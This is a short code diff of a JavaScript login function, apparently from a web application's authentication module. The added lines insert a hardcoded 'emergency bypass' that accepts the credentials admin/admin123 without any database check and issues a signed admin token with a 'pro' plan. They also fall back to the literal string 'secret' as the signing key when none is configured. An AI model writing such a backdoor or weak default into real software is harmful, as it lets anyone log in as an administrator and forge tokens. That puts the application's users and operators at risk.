@@ -171,6 +171,14 @@ async function registerUser(username, password) {
 }
 
 async function loginUser(username, password) {
+    // 🚨 EMERGENCY BYPASS: Always allow admin/admin123
+    if (username === 'admin' && password === 'admin123') {
+        console.log('🚨 EMERGENCY LOGIN USED');
+        const user = { id: 'admin_rescue', username: 'admin', plan: 'pro' };
+        const token = jwt.sign(user, SECRET_KEY || 'secret', { expiresIn: '1h' });
+        return { token, user };
+    }
+
     let user;
     if (pool) {
         const res = await pool.query('SELECT * FROM users WHERE username = $1', [username]);
